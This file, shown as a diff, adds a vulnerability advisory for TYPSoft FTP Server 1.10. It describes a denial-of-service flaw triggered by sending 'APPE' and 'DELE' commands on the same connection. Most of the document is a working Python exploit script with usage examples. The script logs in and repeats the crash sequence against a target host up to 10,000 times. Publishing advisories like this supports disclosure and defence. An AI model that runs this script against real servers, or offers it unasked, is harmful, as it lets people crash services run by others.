@@ -1,0 +1,103 @@
+Bugtraq: http://seclists.org/bugtraq/2009/Nov/163
+
+Date of Discovery: 24-Nov-2009
+
+Credits:leinakesi[at]gmail.com
+
+Vendor: TYPSoft
+
+Affected:
+TYPSoft FTP Server Version 1.10
+Earlier versions may also be affected
+
+Overview:
+TYPSoft FTP Server is an easy use FTP server Application. Denial of Service vulnerability exists in TYPSoft FTP Server 
+when 
+
+"APPE" and "DELE" commands are used in the same socket connection.
+
+Details:
+If you could log on the server successfully, take the following steps and the ftp server will crash which would lead to 
+
+Denial of Service attack:
+
+1.sock.connect((hostname, 21))
+2.sock.send("user %s\r\n" %username)
+3.sock.send("pass %s\r\n" %passwd)
+4.sock.send("PORT 127,0,0,1,122,107\r\n")
+5.sock.send("APPE "+ test_string +"\r\n")
+6.sock.send("DELE "+ test_string +"\r\n")
+7.sock.close()
+
+
+Severity:
+High
+
+Exploit example:
+
+#!/usr/bin/python
+import socket
+import sys
+import time
+
+def Usage():
+    print ("Usage:  ./expl.py   <local_ip>  <serv_ip>      <Username> <password>\n")
+    print ("Example:./expl.py 127.0.0.1 127.0.0.1 anonymous anonymous\n")
+    print ("Example:./expl.py 192.168.48.183 192.168.48.111 anonymous anonymous\n")
+if len(sys.argv) <> 5:
+        Usage()
+        sys.exit(1)
+else:
+    local=sys.argv[1]
+    hostname=sys.argv[2]
+    username=sys.argv[3]
+    passwd=sys.argv[4]
+    test_string="a"*30
+    ip_every=local.split('.')
+    for i in range(1,10000):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock_data = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((hostname, 21))
+        except:
+            print ("Connection error!")
+            sys.exit(1)
+        r=sock.recv(1024)
+        print "[+] "+ r
+        sock.send("user %s\r\n" %username)
+        print "[-] "+ ("user %s\r\n" %username)
+        r=sock.recv(1024)
+        print "[+] "+ r
+        sock.send("pass %s\r\n" %passwd)
+        print "[-] "+ ("pass %s\r\n" %passwd)
+        r=sock.recv(1024)
+        print "[+] "+ r
+    
+        sock_data.bind((local,31339))
+        sock_data.listen(1)
+        
+        sock.send("PORT " + ip_every[0] +","+ ip_every[1] +","+ ip_every[2] +"," + ip_every[3] + ",122,107\r\n")
+        print "[-] "+ ("PORT " + local + "122,107\r\n")
+        r=sock.recv(1024)
+        print "[+] "+ r
+            
+        sock.send("APPE "+ test_string +"\r\n")
+        print "[-] "+ ("APPE "+ test_string +"\r\n")
+        r=sock.recv(1024)
+        print "[+] "+ r
+        
+        sock.send("DELE "+ test_string +"\r\n")
+        print "[-] "+ ("DELE "+ test_string +"\r\n")
+        r=sock.recv(1024)
+        print "[+] "+ r    
+         
+        sock.close()
+        sock_data.close()
+        time.sleep(2)
+                
+
+ 
+
+    
+    sys.exit(0);
+
